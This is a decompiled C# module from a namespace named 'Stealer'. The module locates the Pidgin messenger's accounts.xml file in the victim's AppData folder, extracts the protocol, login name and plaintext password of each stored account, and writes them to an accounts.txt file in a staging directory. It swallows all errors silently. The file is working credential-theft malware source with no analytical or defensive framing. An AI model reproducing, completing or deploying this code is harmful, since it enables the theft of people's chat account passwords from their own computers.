using System;
using System.IO;
using System.Text;
using System.Xml;

namespace Stealer
{
	// Token: 0x02000014 RID: 20
	internal sealed class Pidgin
	{
		// Token: 0x06000071 RID: 113 RVA: 0x000047FC File Offset: 0x000029FC
		public static void GetAccounts(string sSavePath)
		{
			if (!File.Exists(Pidgin.PidginPath))
			{
				return;
			}
			try
			{
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(new XmlTextReader(Pidgin.PidginPath));
				foreach (object obj in xmlDocument.DocumentElement.ChildNodes)
				{
					XmlNode xmlNode = (XmlNode)obj;
					string innerText = xmlNode.ChildNodes[0].InnerText;
					string innerText2 = xmlNode.ChildNodes[1].InnerText;
					string innerText3 = xmlNode.ChildNodes[2].InnerText;
					if (string.IsNullOrEmpty(innerText) || string.IsNullOrEmpty(innerText2) || string.IsNullOrEmpty(innerText3))
					{
						break;
					}
					Pidgin.SBTwo.AppendLine("Protocol: " + innerText);
					Pidgin.SBTwo.AppendLine("Login: " + innerText2);
					Pidgin.SBTwo.AppendLine("Password: " + innerText3 + "\r\n");
					Counter.Pidgin++;
				}
				if (Pidgin.SBTwo.Length > 0)
				{
					Directory.CreateDirectory(sSavePath);
					File.AppendAllText(sSavePath + "\\accounts.txt", Pidgin.SBTwo.ToString());
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000051 RID: 81
		private static StringBuilder SBTwo = new StringBuilder();

		// Token: 0x04000052 RID: 82
		private static readonly string PidginPath = Path.Combine(Paths.appdata, ".purple\\accounts.xml");
	}
}
